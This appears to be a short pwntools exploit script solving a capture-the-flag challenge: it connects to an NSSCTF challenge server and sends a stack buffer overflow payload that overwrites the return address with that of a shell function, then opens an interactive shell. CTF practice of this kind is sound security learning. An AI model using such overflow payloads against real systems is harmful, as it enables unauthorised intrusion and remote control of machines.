from pwn import *

p=remote('node5.anna.nssctf.cn',25400)
shell_addr=0x004014C2

payload=b'a'*(64+8)+p64(shell_addr)

p.sendlineafter("Make a wish:",payload)
p.interactive()